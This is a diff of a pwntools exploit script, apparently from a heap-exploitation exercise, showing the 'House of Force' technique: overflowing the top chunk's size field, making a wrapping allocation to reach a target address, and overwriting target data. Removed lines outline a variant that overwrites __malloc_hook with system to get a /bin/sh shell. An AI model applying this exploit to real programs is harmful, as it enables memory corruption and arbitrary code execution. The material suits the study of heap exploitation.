@@ -37,17 +37,17 @@ io.recvuntil(b"> ")
 io.timeout = 0.1
 
 # =============================================================================
+
+# Request a small chunk to overflow from.
+# Fill the chunk's user data with garbage then overwrite the top chunk's size field with a large value.
 malloc(24, b"Y"*24 + p64(0xffffffffffffffff))
-distance = delta(heap+0x20, elf.sym.target - 0x20)
-malloc(distance, b"Y")
-#malloc(24, b"huhu")
 
+# Make a very large request that spans the gap between the top chunk and the target data.
+# The chunk allocated to service this request will wrap around the VA space.
+malloc(delta((heap + 0x20), (elf.sym.target - 0x20)), b"Y")
 
-#distance = (libc.sym.__malloc_hook - 0x20) - (heap + 0x20)  # khoảng cách = Header - Top chunk hiện tại
-#malloc(distance, "/bin/sh\0") #ptr trả về là chunk + 0x10
-#malloc(24, p64(libc.sym.system))
-#cmd = heap + 0x30
-#malloc(cmd, "")
+# Request another chunk; the first qword of its user data overlaps the target data.
+malloc(24, b"Much win")
 
 # =============================================================================
 
